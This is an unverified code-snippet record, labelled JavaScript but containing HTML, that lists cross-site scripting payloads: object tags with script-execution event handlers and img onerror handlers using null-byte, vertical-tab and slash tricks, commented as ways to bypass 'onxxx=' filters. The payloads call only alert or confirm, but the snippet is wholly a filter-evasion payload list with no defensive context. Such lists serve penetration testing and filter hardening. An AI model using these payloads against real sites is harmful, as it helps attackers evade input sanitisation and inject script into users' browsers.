---
id: 3cd5b493-0bbd-42d0-99c1-01ba9445d372
type: code
language: JavaScript
verified: false
created_at: '2023-04-06T03:56:42.575919+00:00'
updated_at: '2023-04-10T20:21:36.044131+00:00'
---

# Code Snippet 3cd5b493

**Language**: JavaScript

```javascript
<object onafterscriptexecute=confirm(0)>
<object onbeforescriptexecute=confirm(0)>

// Bypass onxxx= filter with a null byte/vertical tab
<img src='1' onerror\x00=alert(0) />
<img src='1' onerror\x0b=alert(0) />

// Bypass onxxx= filter with a '/'
<img src='1' onerror/=alert(0) />
```
